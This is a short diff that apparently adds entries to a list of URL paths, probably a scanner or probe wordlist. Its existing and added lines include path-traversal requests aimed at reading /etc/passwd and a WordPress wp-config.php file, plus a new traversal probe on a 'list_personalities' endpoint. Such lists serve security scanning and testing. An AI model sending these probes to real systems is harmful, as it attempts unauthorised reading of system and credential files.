@@ -38,3 +38,5 @@
 /manifest.json
 /api/file/temp/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 /wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php
+/
+/list_personalities?category=../..
